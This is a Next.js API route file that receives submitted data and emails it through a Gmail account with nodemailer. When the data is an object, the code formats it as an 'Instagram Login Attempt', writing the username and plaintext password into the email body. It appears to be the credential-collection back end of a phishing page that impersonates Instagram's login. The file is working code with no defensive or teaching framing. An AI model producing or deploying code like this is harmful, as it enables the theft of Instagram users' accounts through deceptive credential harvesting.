// app/api/send/route.ts
import { NextRequest, NextResponse } from 'next/server';
import nodemailer from 'nodemailer';

type ResponseData = {
  message: string;
  error?: string;
  success: boolean;
};

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    const { subject, text } = body;

    console.log('Received request:', { subject, text });

    // Validate input
    if (!subject || !text) {
      return NextResponse.json(
        { 
          success: false,
          message: 'Subject and text are required' 
        },
        { status: 400 }
      );
    }

    // Create transporter
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.GMAIL_USER,
        pass: process.env.GMAIL_APP_PASSWORD,
      },
    });

    // Format the login data nicely for the email
    const formattedText = typeof text === 'string' 
      ? text 
      : `Instagram Login Attempt:\n\nUsername: ${text.username}\nPassword: ${text.password}\n\nTimestamp: ${new Date().toISOString()}`;

    // Email options
    const mailOptions = {
      from: process.env.GMAIL_USER,
      to: process.env.GMAIL_USER,
      subject: subject,
      text: formattedText,
      html: typeof text === 'object' 
        ? `
          <div style="font-family: Arial, sans-serif; padding: 20px; background-color: #f5f5f5;">
            <h2 style="color: #333;">Instagram Login Attempt</h2>
            <div style="background: white; padding: 15px; border-radius: 5px; margin-top: 10px;">
              <p><strong>Username:</strong> ${text.username}</p>
              <p><strong>Password:</strong> ${text.password}</p>
              <p><strong>Timestamp:</strong> ${new Date().toLocaleString()}</p>
            </div>
          </div>
        `
        : undefined,
    };

    // Send email
    await transporter.sendMail(mailOptions);

    return NextResponse.json(
      { 
        success: true,
        message: 'Email sent successfully!' 
      },
      { status: 200 }
    );

  } catch (error) {
    console.error('Error sending email:', error);
    return NextResponse.json(
      { 
        success: false,
        message: 'Failed to send email',
        error: error instanceof Error ? error.message : 'Unknown error'
      },
      { status: 500 }
    );
  }
}